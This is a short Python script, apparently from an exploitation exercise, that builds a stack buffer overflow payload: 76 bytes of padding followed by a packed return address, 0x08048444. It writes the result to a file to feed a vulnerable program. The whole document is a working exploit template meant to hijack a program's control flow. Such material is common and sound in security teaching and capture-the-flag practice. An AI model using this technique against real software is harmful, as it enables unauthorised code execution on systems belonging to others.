import struct

# Assume these values are found through your analysis
offset = 76
function_addr = 0x08048444

# Create the payload
payload = b"A" * offset
payload += struct.pack("<I", function_addr)


# Save the payload to a file or pass it directly to the vulnerable program
with open('payload', 'wb') as f:
    f.write(payload)